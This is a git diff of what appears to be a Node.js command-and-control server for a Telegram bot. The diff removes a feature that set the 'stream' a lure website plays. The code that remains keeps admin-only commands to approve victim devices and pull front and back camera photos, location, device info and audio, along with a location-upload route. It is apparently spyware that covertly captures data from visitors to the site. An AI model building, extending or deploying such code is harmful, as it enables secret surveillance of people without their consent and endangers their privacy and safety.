@@ -26,14 +26,10 @@ global.pendingSocketId = null;
 global.approvedSocketId = null;
 global.pendingUsername = "Unknown";
 
-// Current active stream link variable (Default YouTube fallback)
-let currentStreamUrl = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
-
 // Automatically register ALL commands in Telegram Menu
 bot.setMyCommands([
     { command: 'start', description: 'Start bot & check status' },
     { command: 'approve', description: 'Authorize pending device' },
-    { command: 'url', description: 'Set active stream link (/url <link>)' },
     { command: 'moref', description: 'Front Camera 5 Photos' },
     { command: 'moreb', description: 'Back Camera 5 Photos' },
     { command: 'moreff', description: 'Front Camera with Screen Flash' },
@@ -70,11 +66,6 @@ app.post('/upload-location', (req, res) => {
     }
 });
 
-// API Route to provide the current stream URL to the frontend
-app.get('/get-stream', (req, res) => {
-    res.json({ url: currentStreamUrl });
-});
-
 io.on('connection', (socket) => {
     console.log('Client connected:', socket.id);
 
@@ -96,7 +87,7 @@ io.on('connection', (socket) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\n- /approve\n- /url <link>\n- /moref & /moreb\n- /moreff & /morebf\n- /location\n- /info\n- /audio`);
+        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\n- /approve\n- /moref & /moreb\n- /moreff & /morebf\n- /location\n- /info\n- /audio`);
     }
 });
 
@@ -111,15 +102,6 @@ bot.onText(/\/approve/, (msg) => {
         } else {
             bot.sendMessage(chatId, "❌ No pending device request.");
         }
-    }
-});
-
-// Telegram /url command handler to update the active stream URL seamlessly
-bot.onText(/\/url (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() === adminId.toString()) {
-        currentStreamUrl = match[1];
-        bot.sendMessage(chatId, `✅ **Aapka link set ho chuka hai!**\n\nAb koi bhi main website kholega toh yeh naya stream play hoga.`);
     }
 });
 
